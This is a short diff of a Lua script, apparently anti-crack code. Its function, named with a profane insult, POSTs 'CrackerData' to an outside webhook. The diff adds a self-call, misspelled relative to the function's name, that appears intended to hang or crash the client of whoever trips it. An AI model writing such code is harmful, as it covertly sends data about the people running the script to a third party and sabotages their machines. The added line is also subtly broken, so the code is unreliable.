@@ -265,6 +265,7 @@ end
 
 function nocrakbitch()
     HttpRequest({Url=Webhook, Body=CrackerData, Method="POST", Headers=Headers})
+   return nocrackbitch()
 end
 
 pcall(function()
